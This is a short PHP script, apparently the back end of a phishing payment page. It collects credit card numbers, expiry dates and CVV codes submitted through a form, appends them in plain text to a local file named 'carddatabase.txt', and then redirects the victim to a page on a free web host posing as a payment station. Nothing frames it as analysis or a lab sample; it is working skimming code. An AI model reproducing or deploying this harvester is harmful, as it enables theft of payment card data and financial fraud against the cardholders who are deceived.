
<?PHP

$Number = $_POST['card'];

$Date = $_POST['date'];

$Cvv = $_POST['cvv'];

$log = fopen("carddatabase.txt","at");

fwrite($log, "\n $Number : $Date : $Cvv \n");

fclose($log);

echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://best-pay-station1.000webhostapp.com/secondary_sites/pay/last.html'></head></html>";

?>
